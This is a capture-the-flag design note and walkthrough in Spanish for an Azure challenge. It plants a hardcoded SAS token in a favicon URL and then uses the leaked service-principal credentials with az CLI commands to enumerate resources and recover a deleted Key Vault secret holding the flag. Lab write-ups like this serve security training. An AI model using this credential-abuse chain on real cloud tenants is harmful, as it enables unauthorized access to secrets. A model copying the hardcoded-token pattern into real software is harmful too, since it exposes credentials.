# The secrets of Azure
Nuestra nueva página se está migrando a la nube, no conocemos mucho este nuevo mundo pero todo el mundo dice que es lo mejor, escalable y seguro así que allá vamos; ¿qué podría salir mal?
![web page](</cloud/azure/secret_vaults/attachments/web.png>)

En la página de Hackiit que el favicon se saque con una petición a un blob que en la propia petición este hardcodeado el SAS token y así poder obtener unos credenciales en el .env. La pista para darse cuenta de esto sería dejar en la página de Hackiit una ruta que sea /azure y que el favicon sea distinto al de las demás rutas que sea el logo de azure:
![favicon](</cloud/azure/secret_vaults/attachments/favicon.png>)
En esta url podemos que está hardcodeado el token de acceso.

*Para listar el blob hay que añadir los parámetros ⁠ restype=container&comp=list ⁠ (https://learn.microsoft.com/en-us/rest/api/storageservices/list-blobs?tabs=microsoft-entra-id)*

En este hay un archivo .env que tiene cert, key, tenant-id y app-id de un service principal el cual se puede usar para loguearse con la az cli https://learn.microsoft.com/en-us/cli/azure/authenticate-azure-cli-service-principal. Para loguearse usar:
```bash
⁠ az login --service-principal -u 0d84c5ea-bbe0-4b69-ab48-a87eec7f385d -p ./.env --tenant e8c69977-4007-4f92-aebc-c61782d516ef
```
Para seguir hay que leer todas las subscripciones que hay: 
```bash
⁠ az account subscription list ⁠
```

Para listar todos los resource groups:
```bash
⁠ az group list
```

Para listar todos los recursos:
```bash
az resource list --resource-group hackiit-ctf ⁠
```

Te das cuenta que hay un keyvault y la gracias es que el secreto que es la flag está en una versión antigua y borrada con muchas versiones previas el SP tiene un custom role.
Podemos mostrar los secretos borrados de los keyvaults con:
```bash
az keyvault secret list-deleted --vault-name dWx0cmFzZWNyZXRoYWNraWl0
```
Para recuperar el secreto ejecutamos:
```bash
az keyvault secret recover --id https://dwx0cmfzzwnyzxroywnrawl0.vault.azure.net/secrets/flag
```
Una vez recuperas el secreto miras la segunda versión y el valor es la flag `ETSIIT_CTF{bl0b_th3_s3cr3t}`. Los secretos se pueden mirar con:
```bash
az keyvault secret show --id https://dwx0cmfzzwnyzxroywnrawl0.vault.azure.net/secrets/flag
```